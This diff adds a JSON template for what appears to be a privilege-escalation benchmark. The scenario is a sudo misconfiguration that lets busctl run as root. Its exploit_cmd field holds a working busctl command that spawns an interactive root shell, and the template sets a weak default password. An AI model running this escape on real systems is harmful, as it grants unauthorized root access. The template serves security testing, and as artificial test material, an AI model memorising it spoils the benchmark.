@@ -1,0 +1,31 @@
+{
+  "template_id": "auto_T1548_003_sudo_busctl",
+  "category": "A2_sudo",
+  "attack_technique": "T1548.003",
+  "cwe": "CWE-269",
+  "description": "sudo misconfiguration allows running /usr/bin/busctl as root, enabling shell",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "hard",
+  "interaction_mode": "single_command",
+  "dedup_group": "sudo_shell_escape",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "T1548_003_sudo_busctl",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ],
+  "exploit_cmd": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'",
+  "binary_path": "/usr/bin/busctl"
+}
